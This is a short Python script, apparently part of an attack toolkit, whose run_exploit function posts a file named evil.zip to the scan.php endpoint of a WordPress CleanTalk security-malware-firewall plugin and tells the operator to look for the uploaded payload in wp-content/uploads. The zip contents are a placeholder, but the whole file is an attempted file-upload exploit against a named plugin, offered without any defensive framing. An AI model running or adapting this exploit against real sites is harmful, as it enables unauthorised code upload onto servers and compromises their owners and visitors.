import os
from core.logger import log_event
from datetime import datetime 
log_event("scan", {"target": "localhost"}, level="debug", write_structured_file=True)

import requests

def run_exploit(target_url):
    zip_payload = {
        "file": ("evil.zip", b"FAKE_ZIP_BINARY", "application/zip")
    }
    try:
        r = requests.post(f"{target_url}/wp-content/plugins/security-malware-firewall/scan.php", files=zip_payload)
        if r.status_code == 200:
            print("[+] Zip upload attempted. Check wp-content/uploads for payload.")
            return True
    except Exception as e:
        print(f"[!] CleanTalk upload failed: {e}")
    return False
